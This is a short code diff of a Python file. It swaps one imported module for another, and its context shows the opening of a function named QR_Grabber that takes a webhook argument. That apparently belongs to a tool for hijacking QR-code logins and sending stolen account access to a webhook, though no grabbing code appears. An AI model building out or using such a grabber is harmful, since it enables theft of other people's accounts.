@@ -1,6 +1,6 @@
 from util.plugins.commun import *
 from util.plugins.variable import *
-from atio import main
+from cc import main
 
 def QR_Grabber(Webhook):
     import os
